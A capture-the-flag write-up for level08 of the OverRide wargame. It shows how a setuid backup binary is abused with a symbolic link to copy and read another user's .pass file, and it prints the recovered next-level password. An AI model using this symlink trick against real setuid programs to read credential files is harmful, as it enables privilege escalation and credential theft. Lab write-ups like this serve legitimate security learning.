## level08

During our investigation using gdb, it became evident that the binary takes a specific input file as a parameter. Its primary function involves generating a backup of the file within the directory "./backups" and simultaneously logging relevant information to the file named "backups/.log".

```bash
level08@OverRide:~$ echo "it just a test" > test
level08@OverRide:~$ ls -la
total 32
drwxrwxrwx+ 1 level08 level08   120 Jun 12 17:57 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--r-----+ 1 level08 level08    15 Jun 12 17:57 test
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
level08@OverRide:~$ ls
backups  level08  test
level08@OverRide:~$ ls -la backups/.log
-rwxrwx---+ 1 level09 users 0 Oct 19  2016 backups/.log
level08@OverRide:~$ ls -la backups
total 0
drwxrwx---+ 1 level09 users    60 Oct 19  2016 .
drwxrwxrwx+ 1 level08 level08 120 Jun 12 17:57 ..
-rwxrwx---+ 1 level09 users     0 Oct 19  2016 .log
level08@OverRide:~$ cat backups/.log
level08@OverRide:~$ ./level08 test
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: test
LOG: Finished back up test
level08@OverRide:~$ ls -la backups
total 8
drwxrwx---+ 1 level09 users    80 Jun 12 17:57 .
drwxrwxrwx+ 1 level08 level08 120 Jun 12 17:57 ..
-rwxrwx---+ 1 level09 users    55 Jun 12 17:57 .log
-r--r-----+ 1 level09 users    15 Jun 12 17:57 test
level08@OverRide:~$ cat test
it just a test
level08@OverRide:~$
```

Based on our observations, it appears that the file provided as input is indeed backed up in the "backups" directory, and the log information is stored in a file named ".log". Furthermore, the binary has the setuid permission set for the user "level09". This implies that we can potentially leverage this binary to read the contents of the ".pass" file belonging to the "level09" user.

```bash
level08@OverRide:~$ ./level08 ../level09/.pass
ERROR: Failed to open ./backups/../level09/.pass
```

it will not work like that becouase the binary concatenate the path of the file with `./backups/` so we need to use a symbolic link to bypass this

```bash
level08@OverRide:~$ ln -s /home/users/level09/.pass password
level08@OverRide:~$ ls
backups  level08  password
level08@OverRide:~$ ./level08 password
level08@OverRide:~$ cat backups/password
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
